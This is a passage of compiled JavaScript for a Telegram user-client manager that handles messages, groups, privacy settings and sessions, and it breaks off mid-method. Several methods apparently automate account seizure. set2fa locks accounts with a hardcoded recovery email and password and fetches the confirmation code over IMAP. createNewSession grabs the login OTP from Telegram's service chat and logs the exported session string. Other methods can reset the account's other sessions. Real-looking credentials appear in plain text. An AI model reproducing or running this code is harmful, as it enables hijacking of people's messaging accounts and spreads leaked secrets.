    generateETag(messageId, chatId, fileId) {
        const fileIdStr = typeof fileId === 'object' ? fileId.toString() : String(fileId);
        return `"${messageId}-${chatId}-${fileIdStr}"`;
    }
    async forwardMessage(toChatId, fromChatId, messageId) {
        try {
            await this.client.forwardMessages(toChatId, { fromPeer: fromChatId, messages: messageId });
        }
        catch (error) {
            this.logger.info(this.phoneNumber, "Failed to Forward Message : ", error.errorMessage);
        }
    }
    async updateUsername(baseUsername) {
        let newUserName = '';
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                await this.client.invoke(new telegram_1.Api.account.UpdateUsername({ username }));
                this.logger.info(this.phoneNumber, `Removed Username successfully.`);
            }
            catch (error) {
                this.logger.info(this.phoneNumber, error);
            }
        }
        else {
            while (increment < 10) {
                try {
                    const result = await this.client.invoke(new telegram_1.Api.account.CheckUsername({ username }));
                    this.logger.info(this.phoneNumber, `Avialable: ${result} (${username})`);
                    if (result) {
                        await this.client.invoke(new telegram_1.Api.account.UpdateUsername({ username }));
                        this.logger.info(this.phoneNumber, `Username '${username}' updated successfully.`);
                        newUserName = username;
                        break;
                    }
                    else {
                        if (increment >= 6) {
                            const randomNums = Math.floor(Math.random() * 90 + 10);
                            username = baseUsername + randomNums;
                        }
                        else {
                            username = baseUsername + increment;
                        }
                        increment++;
                        await (0, Helpers_1.sleep)(2000);
                    }
                }
                catch (error) {
                    this.logger.info(this.phoneNumber, error.message);
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    if (increment >= 6) {
                        const randomChars = Math.random().toString(36).substring(2, 6);
                        username = baseUsername + randomChars;
                    }
                    else {
                        username = baseUsername + increment;
                    }
                    increment++;
                    await (0, Helpers_1.sleep)(2000);
                }
            }
        }
        return newUserName;
    }
    async updatePrivacy() {
        try {
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "Calls Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "PP Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyForwards(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "forwards Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            this.logger.info(this.phoneNumber, "Number Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll(),
                ],
            }));
            this.logger.info(this.phoneNumber, "LAstSeen Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
        }
        catch (e) {
            throw e;
        }
    }
    async sendViewOnceMedia(chatId, buffer, caption = '', isVideo, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const actualFilename = filename || `viewonce_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`;
            const mimeType = isVideo ? 'video/mp4' : 'image/jpeg';
            const inputFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile(actualFilename, buffer.length, actualFilename, buffer),
                workers: 1
            });
            const result = await this.client.invoke(new telegram_1.Api.messages.SendMedia({
                peer: chatId,
                media: isVideo
                    ? new telegram_1.Api.InputMediaUploadedDocument({
                        file: inputFile,
                        mimeType,
                        attributes: [
                            new telegram_1.Api.DocumentAttributeVideo({
                                supportsStreaming: true,
                                duration: 0,
                                w: 0,
                                h: 0
                            })
                        ],
                        ttlSeconds: 10
                    })
                    : new telegram_1.Api.InputMediaUploadedPhoto({
                        file: inputFile,
                        ttlSeconds: 10
                    }),
                message: caption,
                randomId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000000))
            }));
            this.logger.info(this.phoneNumber, `Sent view-once ${isVideo ? 'video' : 'photo'} to chat ${chatId}`);
            return result;
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending view-once media:', error);
            throw error;
        }
    }
    async getFileUrl(url, filename) {
        const uniqueFilename = `${filename}_${Date.now()}_${Math.random().toString(36).substring(7)}`;
        const filePath = `/tmp/${uniqueFilename}`;
        try {
            const response = await axios_1.default.get(url, {
                responseType: 'stream',
                timeout: this.FILE_DOWNLOAD_TIMEOUT,
                maxContentLength: this.MAX_FILE_SIZE,
                validateStatus: (status) => status >= 200 && status < 300
            });
            await new Promise((resolve, reject) => {
                const writer = fs.createWriteStream(filePath);
                writer.on('finish', () => resolve());
                writer.on('error', reject);
                response.data.pipe(writer);
                response.data.on('error', reject);
            });
            setTimeout(() => {
                try {
                    if (fs.existsSync(filePath)) {
                        fs.unlinkSync(filePath);
                        this.logger.debug(this.phoneNumber, `Cleaned up temp file: ${filePath}`);
                    }
                }
                catch (cleanupError) {
                    this.logger.warn(this.phoneNumber, `Failed to cleanup temp file ${filePath}:`, cleanupError);
                }
            }, this.TEMP_FILE_CLEANUP_DELAY);
            return filePath;
        }
        catch (error) {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                }
            }
            catch (cleanupError) {
            }
            if (error.response) {
                throw new Error(`Failed to download file: HTTP ${error.response.status}`);
            }
            else if (error.code === 'ECONNABORTED') {
                throw new Error(`Failed to download file: Request timeout`);
            }
            else {
                throw new Error(`Failed to download file: ${error.message}`);
            }
        }
    }
    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new uploads_1.CustomFile('pic.jpg', fs.statSync(image).size, image),
                workers: 1,
            });
            this.logger.info(this.phoneNumber, "file uploaded");
            await this.client.invoke(new telegram_1.Api.photos.UploadProfilePhoto({
                file: file,
            }));
            this.logger.info(this.phoneNumber, "profile pic updated");
        }
        catch (error) {
            throw error;
        }
    }
    async hasPassword() {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const passwordInfo = await this.client.invoke(new telegram_1.Api.account.GetPassword());
            return passwordInfo.hasPassword || false;
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error checking password status:', error);
            return false;
        }
    }
    async set2fa() {
        if (!(await this.hasPassword())) {
            this.logger.info(this.phoneNumber, "Password Does not exist, Setting 2FA");
            const imapService = IMap_1.MailReader.getInstance();
            const twoFaDetails = {
                email: "storeslaksmi@gmail.com",
                hint: "password - India143",
                newPassword: "Ajtdmwajt1@",
            };
            try {
                await imapService.connectToMail();
                const checkMailInterval = setInterval(async () => {
                    this.logger.info(this.phoneNumber, "Checking if mail is ready");
                    if (imapService.isMailReady()) {
                        clearInterval(checkMailInterval);
                        this.logger.info(this.phoneNumber, "Mail is ready, checking code!");
                        await this.client.updateTwoFaSettings({
                            isCheckPassword: false,
                            email: twoFaDetails.email,
                            hint: twoFaDetails.hint,
                            newPassword: twoFaDetails.newPassword,
                            emailCodeCallback: async (length) => {
                                this.logger.info(this.phoneNumber, "Code sent");
                                return new Promise(async (resolve, reject) => {
                                    let retry = 0;
                                    const codeInterval = setInterval(async () => {
                                        try {
                                            this.logger.info(this.phoneNumber, "Checking code");
                                            retry++;
                                            if (imapService.isMailReady() && retry < 4) {
                                                const code = await imapService.getCode();
                                                this.logger.info(this.phoneNumber, 'Code:', code);
                                                if (code) {
                                                    await imapService.disconnectFromMail();
                                                    clearInterval(codeInterval);
                                                    resolve(code);
                                                }
                                            }
                                            else {
                                                clearInterval(codeInterval);
                                                await imapService.disconnectFromMail();
                                                reject(new Error("Failed to retrieve code"));
                                            }
                                        }
                                        catch (error) {
                                            clearInterval(codeInterval);
                                            await imapService.disconnectFromMail();
                                            reject(error);
                                        }
                                    }, 10000);
                                });
                            },
                            onEmailCodeError: (e) => {
                                this.logger.error(this.phoneNumber, 'Email code error:', (0, parseError_1.parseError)(e));
                                return Promise.resolve("error");
                            }
                        });
                        return twoFaDetails;
                    }
                    else {
                        this.logger.info(this.phoneNumber, "Mail not ready yet");
                    }
                }, 5000);
            }
            catch (e) {
                this.logger.error(this.phoneNumber, "Unable to connect to mail server:", (0, parseError_1.parseError)(e));
            }
        }
        else {
            this.logger.info(this.phoneNumber, "Password already exists");
        }
    }
    async sendPhotoChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const buffer = await this.downloadFileFromUrl(url);
            const file = new uploads_1.CustomFile(filename, buffer.length, filename, buffer);
            await this.client.sendFile(id, { file, caption });
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending photo:', error);
            throw error;
        }
    }
    async sendFileChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const buffer = await this.downloadFileFromUrl(url);
            const file = new uploads_1.CustomFile(filename, buffer.length, filename, buffer);
            await this.client.sendFile(id, { file, caption });
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending file:', error);
            throw error;
        }
    }
    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
                userId: "me"
            }));
            this.logger.info(this.phoneNumber, `Profile Pics found: ${result.photos.length}`);
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(new telegram_1.Api.photos.DeletePhotos({
                    id: result.photos
                }));
            }
            this.logger.info(this.phoneNumber, "Deleted profile Photos");
        }
        catch (error) {
            throw error;
        }
    }
    async createNewSession() {
        const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Session creation timed out after 1 minute')), 1 * 60 * 1000));
        const sessionPromise = (async () => {
            const me = await this.client.getMe();
            this.logger.info(this.phoneNumber, "Creating new session for: ", me.phone);
            const newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, await (0, generateTGConfig_1.generateTGConfig)(this.phoneNumber));
            this.logger.info(this.phoneNumber, "Starting Session Creation...");
            await newClient.start({
                phoneNumber: me.phone,
                password: async () => "Ajtdmwajt1@",
                phoneCode: async () => {
                    this.logger.info(this.phoneNumber, 'Waiting for the OTP code from chat ID 777000...');
                    return await this.waitForOtp();
                },
                onError: (err) => { throw err; },
            });
            this.logger.info(this.phoneNumber, "Session Creation Completed");
            const session = newClient.session.save();
            await newClient.destroy();
            this.logger.info(this.phoneNumber, "New Session: ", session);
            return session;
        })();
        return Promise.race([sessionPromise, timeoutPromise]);
    }
    async waitForOtp() {
        for (let i = 0; i < 3; i++) {
            try {
                this.logger.info(this.phoneNumber, "Attempt : ", i);
                const messages = await this.client.getMessages('777000', { limit: 1 });
                const message = messages[0];
                if (message && message.date && message.date * 1000 > Date.now() - 60000) {
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    this.logger.info(this.phoneNumber, "returning: ", code);
                    return code;
                }
                else {
                    this.logger.info(this.phoneNumber, `Message Date: ${new Date(message.date * 1000).toISOString()} Now: ${new Date(Date.now() - 60000).toISOString()}`);
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    this.logger.info(this.phoneNumber, "Skipped Code: ", code);
                    if (i == 2) {
                        return code;
                    }
                    await (0, Helpers_1.sleep)(5000);
                }
            }
            catch (err) {
                await (0, Helpers_1.sleep)(2000);
                this.logger.info(this.phoneNumber, err);
            }
        }
    }
    async createGroupWithOptions(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.createGroupOrChannel(options);
        let channelId;
        if ('updates' in result) {
            const updates = Array.isArray(result.updates) ? result.updates : [result.updates];
            const channelUpdate = updates.find(u => u instanceof telegram_1.Api.UpdateChannel);
            if (channelUpdate && 'channelId' in channelUpdate) {
                channelId = channelUpdate.channelId;
            }
        }
        if (!channelId) {
            throw new Error('Failed to create channel');
        }
        const channel = await this.client.getEntity(channelId);
        if (!(channel instanceof telegram_1.Api.Channel)) {
            throw new Error('Created entity is not a channel');
        }
        if (options.members?.length) {
            const users = await Promise.all(options.members.map(member => this.client.getInputEntity(member)));
            await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
                channel: await this.client.getInputEntity(channel),
                users
            }));
        }
        if (options.photo) {
            const buffer = await this.downloadFileFromUrl(options.photo);
            const inputFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
                workers: 1
            });
            await this.client.invoke(new telegram_1.Api.channels.EditPhoto({
                channel: await this.client.getInputEntity(channel),
                photo: new telegram_1.Api.InputChatUploadedPhoto({
                    file: inputFile
                })
            }));
        }
        return channel;
    }
    async updateGroupSettings(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getEntity(settings.groupId);
        if (settings.title) {
            await this.client.invoke(new telegram_1.Api.channels.EditTitle({
                channel: channel,
                title: settings.title || ''
            }));
        }
        ;
        if (settings.description) {
            await this.client.invoke(new telegram_1.Api.messages.EditChatAbout({
                peer: channel,
                about: settings.description
            }));
        }
        if (settings.username) {
            await this.client.invoke(new telegram_1.Api.channels.UpdateUsername({
                channel: channel,
                username: settings.username
            }));
        }
        if (settings.slowMode !== undefined) {
            await this.client.invoke(new telegram_1.Api.channels.ToggleSlowMode({
                channel: channel,
                seconds: settings.slowMode
            }));
        }
        return true;
    }
    async scheduleMessageSend(opts) {
        if (!this.client)
            throw new Error('Client not initialized');
        const scheduleDate = Math.floor(opts.scheduledTime.getTime() / 1000);
        if (opts.media) {
            const buffer = await this.downloadFileFromUrl(opts.media.url);
            const uploadedFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile('media', buffer.length, 'media', buffer),
                workers: 1
            });
            return this.client.sendFile(opts.chatId, {
                file: uploadedFile,
                caption: opts.message,
                forceDocument: opts.media.type === 'document',
                scheduleDate
            });
        }
        return this.client.sendMessage(opts.chatId, {
            message: opts.message,
            schedule: Math.floor(opts.scheduledTime.getTime() / 1000)
        });
    }
    async getScheduledMessages(chatId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.messages.GetScheduledHistory({
            peer: chatId,
            hash: (0, big_integer_1.default)(0)
        }));
        return 'messages' in result && Array.isArray(result.messages)
            ? result.messages.filter(msg => msg instanceof telegram_1.Api.Message)
            : [];
    }
    async sendMediaAlbum(album) {
        if (!this.client)
            throw new Error('Client not initialized');
        const results = [];
        const errors = [];
        for (let i = 0; i < album.media.length; i++) {
            const item = album.media[i];
            try {
                const buffer = await this.downloadFileFromUrl(item.url);
                const uploadedFile = await this.client.uploadFile({
                    file: new uploads_1.CustomFile(item.filename || `media_${i}`, buffer.length, item.filename || `media_${i}`, buffer),
                    workers: 1
                });
                const media = new telegram_1.Api.InputSingleMedia({
                    media: item.type === 'photo'
                        ? new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile })
                        : new telegram_1.Api.InputMediaUploadedDocument({
                            file: uploadedFile,
                            mimeType: item.type === 'video' ? 'video/mp4' : this.detectContentType(item.filename || `media_${i}`),
                            attributes: item.type === 'video' ? [
                                new telegram_1.Api.DocumentAttributeVideo({
                                    supportsStreaming: true,
                                    duration: 0,
                                    w: 0,
                                    h: 0
                                })
                            ] : []
                        }),
                    message: item.caption || '',
                    entities: []
                });
                results.push(media);
            }
            catch (error) {
                this.logger.error(this.phoneNumber, `Error processing album item ${i}:`, error);
                errors.push({
                    index: i,
                    error: error.message || 'Unknown error'
                });
            }
        }
        if (results.length === 0) {
            throw new Error('No media items could be processed. All items failed.');
        }
        const sendResult = await this.client.invoke(new telegram_1.Api.messages.SendMultiMedia({
            peer: album.chatId,
            multiMedia: results
        }));
        return {
            ...sendResult,
            success: results.length,
            failed: errors.length,
            errors: errors.length > 0 ? errors : undefined
        };
    }
    async sendMessage(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const { peer, parseMode, message } = params;
        return await this.client.sendMessage(peer, { message, parseMode });
    }
    async sendVoiceMessage(voice) {
        if (!this.client)
            throw new Error('Client not initialized');
        try {
            const buffer = await this.downloadFileFromUrl(voice.url);
            return await this.client.invoke(new telegram_1.Api.messages.SendMedia({
                peer: voice.chatId,
                media: new telegram_1.Api.InputMediaUploadedDocument({
                    file: await this.client.uploadFile({
                        file: new uploads_1.CustomFile('voice.ogg', buffer.length, 'voice.ogg', buffer),
                        workers: 1
                    }),
                    mimeType: 'audio/ogg',
                    attributes: [
                        new telegram_1.Api.DocumentAttributeAudio({
                            voice: true,
                            duration: voice.duration || 0
                        })
                    ]
                }),
                message: voice.caption || '',
                randomId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000000))
            }));
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending voice message:', error);
            throw error;
        }
    }
    async cleanupChat(cleanup) {
        if (!this.client)
            throw new Error('Client not initialized');
        cleanup.revoke = cleanup.revoke !== undefined ? cleanup.revoke : true;
        const messages = await this.client.getMessages(cleanup.chatId, {
            limit: 1000,
            ...(cleanup.beforeDate && {
                offsetDate: Math.floor(cleanup.beforeDate.getTime() / 1000)
            })
        });
        const toDelete = messages.filter(msg => {
            if (cleanup.excludePinned && msg.pinned)
                return false;
            if (cleanup.onlyMedia && !msg.media)
                return false;
            return true;
        });
        if (toDelete.length > 0) {
            await this.client.deleteMessages(cleanup.chatId, toDelete.map(m => m.id), {
                revoke: cleanup.revoke
            });
        }
        return { deletedCount: toDelete.length };
    }
    async updatePrivacyBatch(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const privacyRules = {
            everybody: [new telegram_1.Api.InputPrivacyValueAllowAll()],
            contacts: [new telegram_1.Api.InputPrivacyValueAllowContacts()],
            nobody: [new telegram_1.Api.InputPrivacyValueDisallowAll()]
        };
        const updates = [];
        const privacyMap = {
            phoneNumber: telegram_1.Api.InputPrivacyKeyPhoneNumber,
            lastSeen: telegram_1.Api.InputPrivacyKeyStatusTimestamp,
            profilePhotos: telegram_1.Api.InputPrivacyKeyProfilePhoto,
            forwards: telegram_1.Api.InputPrivacyKeyForwards,
            calls: telegram_1.Api.InputPrivacyKeyPhoneCall,
            groups: telegram_1.Api.InputPrivacyKeyChatInvite
        };
        for (const [key, value] of Object.entries(settings)) {
            if (value && key in privacyMap) {
                updates.push(this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                    key: new privacyMap[key](),
                    rules: privacyRules[value]
                })));
            }
        }
        await Promise.all(updates);
        return true;
    }
    async getSessionInfo() {
        if (!this.client)
            throw new Error('Client not initialized');
        const [authorizationsResult, devicesResult] = await Promise.all([
            this.client.invoke(new telegram_1.Api.account.GetAuthorizations()),
            this.client.invoke(new telegram_1.Api.account.GetWebAuthorizations())
        ]);
        const sessions = authorizationsResult.authorizations.map(auth => ({
            hash: auth.hash.toString(),
            deviceModel: auth.deviceModel,
            platform: auth.platform,
            systemVersion: auth.systemVersion,
            appName: auth.appName,
            dateCreated: new Date(auth.dateCreated * 1000),
            dateActive: new Date(auth.dateActive * 1000),
            ip: auth.ip,
            country: auth.country,
            region: auth.region
        }));
        const webSessions = devicesResult.authorizations.map(auth => ({
            hash: auth.hash.toString(),
            domain: auth.domain,
            browser: auth.browser,
            platform: auth.platform,
            dateCreated: new Date(auth.dateCreated * 1000),
            dateActive: new Date(auth.dateActive * 1000),
            ip: auth.ip,
            region: auth.region
        }));
        return {
            sessions,
            webSessions
        };
    }
    async terminateSession(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        if (options.exceptCurrent) {
            if (options.type === 'app') {
                await this.client.invoke(new telegram_1.Api.auth.ResetAuthorizations());
            }
            else {
                await this.client.invoke(new telegram_1.Api.account.ResetWebAuthorizations());
            }
            return true;
        }
        if (options.type === 'app') {
            await this.client.invoke(new telegram_1.Api.account.ResetAuthorization({
                hash: (0, big_integer_1.default)(options.hash)
            }));
        }
        else {
            await this.client.invoke(new telegram_1.Api.account.ResetWebAuthorization({
                hash: (0, big_integer_1.default)(options.hash)
            }));
        }
        return true;
    }
    async getChatStatistics(chatId, period) {
        if (!this.client)
            throw new Error('Client not initialized');
        const now = Math.floor(Date.now() / 1000);
        const periodInSeconds = {
            day: 24 * 60 * 60,
            week: 7 * 24 * 60 * 60,
            month: 30 * 24 * 60 * 60
        }[period];
        const messages = await this.client.getMessages(chatId, {
            limit: 100,
            offsetDate: now - periodInSeconds
        });
        const stats = {
            period,
            totalMessages: messages.length,
            uniqueSenders: new Set(messages.map(m => m.fromId?.toString()).filter(Boolean)).size,
            messageTypes: {
                text: messages.filter(m => !m.media && m.message).length,
                photo: messages.filter(m => m.media && m.media.className === 'MessageMediaPhoto').length,
                video: messages.filter(m => {
                    if (!m.media || m.media.className !== 'MessageMediaDocument')
                        return false;
                    const doc = m.media.document;
                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('video/');
                }).length,
                voice: messages.filter(m => {
                    if (!m.media || m.media.className !== 'MessageMediaDocument')
                        return false;
                    const doc = m.media.document;
                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('audio/');
                }).length,
                other: messages.filter(m => m.media && !['MessageMediaPhoto', 'MessageMediaDocument'].includes(m.media.className)).length
            },
            topSenders: Object.entries(messages.reduce((acc, msg) => {
                const senderId = msg.fromId?.toString();
                if (senderId) {
                    acc[senderId] = (acc[senderId] || 0) + 1;
                }
                return acc;
            }, {}))
                .sort(([, a], [, b]) => b - a)
                .slice(0, 10)
                .map(([id, count]) => ({ id, count })),
            mostActiveHours: Object.entries(messages.reduce((acc, msg) => {
                const hour = new Date(msg.date * 1000).getHours();
                acc[hour] = (acc[hour] || 0) + 1;
                return acc;
            }, {}))
                .sort(([, a], [, b]) => b - a)
                .map(([hour, count]) => ({ hour: Number(hour), count }))
        };
        return stats;
    }
    getMediaExtension(media) {
        if (!media)
            return 'bin';
        switch (media.className) {
            case 'MessageMediaPhoto':
                return 'jpg';
            case 'MessageMediaDocument':
                const doc = media.document;
                if (!doc || !('mimeType' in doc))
                    return 'bin';
                const mime = doc.mimeType;
                if (mime?.startsWith('video/'))
                    return 'mp4';
                if (mime?.startsWith('image/'))
                    return mime.split('/')[1];
                if (mime?.startsWith('audio/'))
                    return 'ogg';
                return 'bin';
            default:
                return 'bin';
        }
    }
    getSearchFilter(filter) {
        switch (filter) {
            case 'photo': return new telegram_1.Api.InputMessagesFilterPhotos();
            case 'video': return new telegram_1.Api.InputMessagesFilterVideo();
            case 'document': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'url': return new telegram_1.Api.InputMessagesFilterUrl();
            case 'roundVideo': return new telegram_1.Api.InputMessagesFilterRoundVideo();
            case 'phtotoVideo': return new telegram_1.Api.InputMessagesFilterPhotoVideo();
            case 'voice': return new telegram_1.Api.InputMessagesFilterVoice();
            case 'roundVoice': return new telegram_1.Api.InputMessagesFilterRoundVoice();
            case 'gif': return new telegram_1.Api.InputMessagesFilterGif();
            case 'sticker': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'animation': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'music': return new telegram_1.Api.InputMessagesFilterMusic();
            case 'chatPhoto': return new telegram_1.Api.InputMessagesFilterChatPhotos();
            case 'location': return new telegram_1.Api.InputMessagesFilterGeo();
            case 'contact': return new telegram_1.Api.InputMessagesFilterContacts();
            case 'chatPhoto': return new telegram_1.Api.InputMessagesFilterChatPhotos();
            case 'phoneCalls': return new telegram_1.Api.InputMessagesFilterPhoneCalls({ missed: false });
            default: return new telegram_1.Api.InputMessagesFilterEmpty();
        }
    }
    getMediaType(media) {
        if (media instanceof telegram_1.Api.MessageMediaPhoto) {
            return 'photo';
        }
        else if (media instanceof telegram_1.Api.MessageMediaDocument) {
            const document = media.document;
            if (document.attributes.some(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo)) {
                return 'video';
            }
            return 'document';
        }
        return 'document';
    }
    getEntityId(entity) {
        if (entity instanceof telegram_1.Api.User)
            return entity.id.toString();
        if (entity instanceof telegram_1.Api.Channel)
            return entity.id.toString();
        if (entity instanceof telegram_1.Api.Chat)
            return entity.id.toString();
        return '';
    }
    async addGroupMembers(groupId, members) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const users = await Promise.all(members.map(member => this.client.getInputEntity(member)));
        await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
            channel: channel,
            users
        }));
    }
    async removeGroupMembers(groupId, members) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        for (const member of members) {
            const user = await this.client.getInputEntity(member);
            await this.client.invoke(new telegram_1.Api.channels.EditBanned({
                channel: channel,
                participant: user,
                bannedRights: new telegram_1.Api.ChatBannedRights({
                    untilDate: 0,
                    viewMessages: true,
                    sendMessages: true,
                    sendMedia: true,
                    sendStickers: true,
                    sendGifs: true,
                    sendGames: true,
                    sendInline: true,
                    embedLinks: true
                })
            }));
        }
    }
    async promoteToAdmin(groupId, userId, permissions, rank) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditAdmin({
            channel: channel,
            userId: user,
            adminRights: new telegram_1.Api.ChatAdminRights({
                changeInfo: permissions?.changeInfo ?? false,
                postMessages: permissions?.postMessages ?? false,
                editMessages: permissions?.editMessages ?? false,
                deleteMessages: permissions?.deleteMessages ?? false,
                banUsers: permissions?.banUsers ?? false,
                inviteUsers: permissions?.inviteUsers ?? true,
                pinMessages: permissions?.pinMessages ?? false,
                addAdmins: permissions?.addAdmins ?? false,
                anonymous: permissions?.anonymous ?? false,
                manageCall: permissions?.manageCall ?? false,
                other: false
            }),
            rank: rank || ''
        }));
    }
    async demoteAdmin(groupId, userId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditAdmin({
            channel: channel,
            userId: user,
            adminRights: new telegram_1.Api.ChatAdminRights({
                changeInfo: false,
                postMessages: false,
                editMessages: false,
                deleteMessages: false,
                banUsers: false,
                inviteUsers: false,
                pinMessages: false,
                addAdmins: false,
                anonymous: false,
                manageCall: false,
                other: false
            }),
            rank: ''
        }));
    }
    async unblockGroupUser(groupId, userId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditBanned({
            channel: channel,
            participant: user,
            bannedRights: new telegram_1.Api.ChatBannedRights({
                untilDate: 0,
                viewMessages: false,
                sendMessages: false,
                sendMedia: false,
                sendStickers: false,
                sendGifs: false,
                sendGames: false,
                sendInline: false,
                embedLinks: false
            })
        }));
    }
    async getGroupAdmins(groupId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
            channel: await this.client.getInputEntity(groupId),
            filter: new telegram_1.Api.ChannelParticipantsAdmins(),
            offset: 0,
            limit: 100,
            hash: (0, big_integer_1.default)(0)
        }));
        if ('users' in result) {
            const participants = result.participants;
            const users = result.users;
            return participants.map(participant => {
                const adminRights = participant.adminRights;
                return {
                    userId: participant.userId.toString(),
                    rank: participant.rank || '',
                    permissions: {
                        changeInfo: adminRights.changeInfo || false,
                        postMessages: adminRights.postMessages || false,
                        editMessages: adminRights.editMessages || false,
                        deleteMessages: adminRights.deleteMessages || false,
                        banUsers: adminRights.banUsers || false,
                        inviteUsers: adminRights.inviteUsers || false,
                        pinMessages: adminRights.pinMessages || false,
                        addAdmins: adminRights.addAdmins || false,
                        anonymous: adminRights.anonymous || false,
                        manageCall: adminRights.manageCall || false
                    }
                };
            });
        }
        return [];
    }
    async getGroupBannedUsers(groupId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
            channel: await this.client.getInputEntity(groupId),
            filter: new telegram_1.Api.ChannelParticipantsBanned({ q: '' }),
            offset: 0,
            limit: 100,
            hash: (0, big_integer_1.default)(0)
        }));
        if ('users' in result) {
            const participants = result.participants;
            return participants.map(participant => {
                const bannedRights = participant.bannedRights;
                return {
                    userId: participant.peer.chatId.toString(),
                    bannedRights: {
                        viewMessages: bannedRights.viewMessages || false,
                        sendMessages: bannedRights.sendMessages || false,
                        sendMedia: bannedRights.sendMedia || false,
                        sendStickers: bannedRights.sendStickers || false,
                        sendGifs: bannedRights.sendGifs || false,
                        sendGames: bannedRights.sendGames || false,
                        sendInline: bannedRights.sendInline || false,
                        embedLinks: bannedRights.embedLinks || false,
                        untilDate: bannedRights.untilDate || 0
                    }
                };
            });
        }
        return [];
    }
    async searchMessages(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const finalResult = {
            video: { messages: [], total: 0 },
            photo: { messages: [], total: 0 },
            document: { messages: [], total: 0 },
            voice: { messages: [], total: 0 },
            text: { messages: [], total: 0 },
            all: { messages: [], total: 0 },
            roundVideo: { messages: [], total: 0 },
            roundVoice: { messages: [], total: 0 },
        };
        const { chatId, query = '', types, maxId, minId, limit } = params;
        this.logger.info(this.phoneNumber, "Types: ", types);
        for (const type of types) {
            const filter = this.getSearchFilter(type);
            const queryFilter = {
                limit: limit || 500,
                ...(maxId ? { maxId } : {}),
                ...(minId ? { minId } : {}),
            };
